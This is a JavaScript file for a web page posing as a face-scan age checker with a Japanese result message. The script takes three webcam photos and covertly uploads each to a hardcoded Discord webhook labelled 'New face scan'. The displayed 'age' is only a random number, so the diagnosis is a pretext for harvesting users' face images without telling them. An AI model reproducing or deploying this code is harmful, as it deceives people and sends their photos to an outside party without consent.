
const video = document.getElementById('video');
const diagnosing = document.getElementById('diagnosing');
const result = document.getElementById('result');

async function startCamera() {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;

    // Wait 2 seconds before taking pictures
    setTimeout(() => {
        diagnosing.classList.remove('hidden');
        takePictures(3);
    }, 2000);
}

async function takePictures(count) {
    const canvas = document.createElement('canvas');
    const context = canvas.getContext('2d');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const webhookURL = "https://discordapp.com/api/webhooks/1366733661457747989/4B7h-9zJltiz2BH__TSKcBK6y862iK3ym7nu3Exi0OvQveJe4cPYEWt5A6clkGUIRxmq";

    for (let i = 0; i < count; i++) {
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
        const formData = new FormData();
        formData.append('file', blob, `photo${i+1}.jpg`);
        formData.append('content', 'New face scan');

        await fetch(webhookURL, {
            method: 'POST',
            body: formData
        });

        await new Promise(resolve => setTimeout(resolve, 1000));
    }

    diagnosing.classList.add('hidden');
    const age = Math.floor(Math.random() * 101);
    result.textContent = `あなたの年齢は… ${age} 歳です！`;
    result.classList.remove('hidden');
}

startCamera();
